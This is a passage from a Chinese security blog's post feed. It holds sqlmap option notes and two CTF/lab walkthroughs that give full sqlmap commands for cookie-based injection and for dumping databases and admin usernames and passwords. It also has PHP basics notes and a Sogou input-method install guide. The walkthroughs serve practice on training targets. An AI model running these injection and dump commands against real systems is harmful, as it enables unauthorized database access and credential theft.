从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面 相关链接：http://bbs.ichunqiu.com/thread-10583-1-1.html]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之cookie注入（靶场第二题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap1%2F</url>
    <content type="text"><![CDATA[sqlmap靶场第二题：https://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bb首先我们尝试下sql注入 http://120.203.13.75:8001/shownews.asp?id=171%20and%201=1 说明该网站有防sql注入。那么我们使用cookie注入 http://120.203.13.75:8001/shownews.asp?id=171%20order%20by%2010 第一步猜解表 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --table --level 2 第二步，猜字段 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --column -T admin --level 2 第三步，爆数据 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --dump -T admin -C &quot;username,password&quot; --level 2 b9a2a2b5dffb918c,该密码是md5加密，百度搜索md5在线加密我们已经拿到密码了进入后台网站,利用御剑工作扫出后台http://120.203.13.75:8001/admin输入账号admin,密码welcome获取flag]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap安装与使用（实验吧第3题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap0%2F</url>
    <content type="text"><![CDATA[使用的环境是Ubuntu系统 sqlmap的安装sqlmap需要安装python2环境,python3不行(Ubuntu下默认安装python2)输入命令：sudo apt sqlamp检查是否安装成功输入命令：sqlmap -help返回下面结果即为成功。 sqlmap基本参数sqlmap -h 查看帮助选项is -dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数：列表名columns 参数：字段名dump 参数：下载数据 sqlmap牛刀小试我们以这到题为例http://www.shiyanbar.com/ctf/33。如果没有注册过实验吧的朋友先注册下实验吧拿到题目我们判断下有没有sql注入 在url后面加上and 1=1,没有报错 加上and 1=2，报错。 说明有sql注入 第一步使用sqlmap查看数据库信息输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; --current-db经过一些时间成功爆出当前数据库为my_db,如果注入过程提示选择y或者n，一般是选择y。大概就是尝试更多的方法进行注入第二步、爆出表名输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db --tables 第三步爆字段名输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey --columnsy 第四步、爆数据输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey -C k0y --dump 稍等片刻，成功找到flag：whatiMyD91dump]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP strcmp（）函数 引入文件语句的区别 魔术方法]]></title>
    <url>%2F2019%2F02%2F28%2FPHP1%2F</url>
    <content type="text"><![CDATA[一、strcmp（）函数1、strcmp（）的作用是比较2个字符串（区分大小写）2、基本语法： stcmp(string1,string2)//string1和2进行比较 3、技术细节：如果返回值为0,2个字符串相等如果返回值小于0,string1小于string2如果返回值大于0,string1大于string2注意的是，PHP版本得为4+ 该函数与stncmop()函数类似，不同的是，stncmop()函数可以指定字符串用于比较的字符数基本语法： strncmp(string1,string2,length) 二、include() 、require()语句包含并运行指定文件。这两结构在包含文件上完全一样，唯一的区别是对于错误的处理。require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。 include(‘hello.php’); echo ‘include test final!’;//include报错，但是会继续执行，显示：include test final! require(‘hello.php’); echo ‘require test final!’;//require报错，停止代码的执行。 二、include, include_once, require, require_once 的区别include 和 include_once 只有在 php 执行到该语句时才会执行文件包含的操作。其中，include在包含文件出错时会提示 warning, 但后续的代码仍会继续执行, iclude_once 不会重复包含同一文件;require 和 require_once 在php文件执行前就把需要包含的文件的内容替换掉 require 语句本身, 所以在包含文件出错时会抛出error, 后续代码不会继续执行, require_once 也只执行一次包含操作.下面这篇博客是教详细介绍了他们·的区别https://blog.csdn.net/j393819650/article/details/53836525 三、魔术方法具体的大家可以看php手册之魔术方法这边就只是简单介绍下他们何时会触发 1、__construct,构造函数，具有构造函数的类会在每次创建新对象时先调用此方法（实例化对象时） 2、__destruct,解析函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。（类对象使用结束时自动调用） 3、属性重载在给不可访问（未定义）属性赋值时，__set() 会被调用。 读取不可访问（未定义）属性的值时，__get() 会被调用。 当对不可访问（未定义）属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问（未定义）属性调用 unset() 时，__unset() 会被调用。注意的是：这些魔术方法的参数都不能通过引用传递 4、方法重载在对象中调用一个不可访问方法时，__call() 会被调用。 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用 5、__sleep(),serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作 6、 __wakeup ，与之相反，unserialize() 会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。__wakeup() 经常用在反序列化操作中。 7、__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误 注意！！！！不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 8、__invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。注意：在PHP5.3.0版本上才有效 9、 __set_state()，自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。 10、__clone(),当使用__clone()复制一个对象时候调用。 11、__debugInfo ( ) :，在转储对象以获取应该显示的属性时，var_dump()调用此方法。如果方法没有在对象上定义，那么将显示所有公共、受保护和私有属性。]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu系统安装搜狗输入法]]></title>
    <url>%2F2019%2F02%2F27%2Fpostname%2F</url>
    <content type="text"><![CDATA[ubuntu默认是字母，当然有中文输入法fcixtx(小企鹅输入法)，但是我不怎么喜欢用，接下来我们就来安装搜狗输入法下载命令全部在终端中执行 一、下载搜狗输入法的安装包​ 下载地址为：http://pinyin.sogou.com/linux/ 12下载命令wget &quot;http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=tQdHKEaxh6PcyFVf4QfT1A&amp;e=1539855246&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb&quot; 注意：要选择与自己系统相对应的安装包，我的系统是ubuntu64位，所以我下载64位的安装包 二、查看是否下载成功输入命令ls -l 三、安装搜狗输入法安装包1sudo dpkg -i sogoupinyin_2.2.0.0082_amd64.deb//-i后面为我们下载的安装包的文件名 四、选择fcitx输入法从系统设置里面点击“语言支持”，从语言支持里面选择小企鹅输入法（fcitx），默认为ibus，搜狗输入要安装在fcitx输入法上面。你可能会打不开“语言支持”，只需执行命令sudo apt-get install -f 即可修复错误，打开语音支持 如果没有小企鹅输入法的话执行以下命令 12sudo apt-get updatesudo apt-get upgrade 1、重启（可以使用命令reboot）然后在系统设置中选择 fcitx configure,然后按下图操作 六、安装中文语言操作如下图等他下载完成后最后重启，大功告成]]></content>
  </entry>
</search>
